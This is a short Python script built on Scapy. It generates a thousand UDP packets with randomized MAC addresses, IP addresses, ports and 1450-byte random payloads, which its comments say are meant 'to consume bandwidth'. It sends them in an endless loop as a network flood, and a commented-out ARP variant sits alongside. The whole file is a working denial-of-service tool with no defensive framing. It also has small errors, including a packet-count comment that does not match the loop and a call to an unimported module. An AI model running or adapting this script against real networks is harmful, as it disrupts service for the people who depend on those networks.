from scapy.all import *
from random import randint
from random import choice

#l=random.choice('0123456789abcdef')
#m=RandMAC()

#Ethernet layer with random MACs
Eth_layer=Ether(dst=RandMAC(),src=RandMAC())
#IP layer with random IPs
IP_layer=IP(src=RandIP(),dst=RandIP())
#Arp later with random MACs and IPs
Arp_layer=ARP(hwsrc=RandMAC(),hwdst=RandMAC(), pdst=RandIP(), psrc=RandIP())
#UDP layer with random
UDP_layer=UDP(sport=random.randint(1,66535),dport=random.randint(1,66535))
#Main content, randomized and inserted to consume bandwidth
Raw_content=Raw(load=RandString(size=1450))

#start a list holding the attack packets
strike=[]
#generate 10000 packets
for pktNum in range(0,1000):
#Use the ethernet and arp layer to generate a packet
#	ARP_Strike=Eth_layer/Arp_layer/Raw_content
	UDP_Strike=Eth_layer/IP_layer/UDP_layer/Raw_content
#append packets to the list
#	strike.append(ARP_Strike)
	strike.append(UDP_Strike)

#send(strike)
try:
	while 1:
		sendp(strike)
		#sendpfast(strike,pps=10000, mbps=1000)
except KeyboardInterrupt: 
	print ("User interruption")
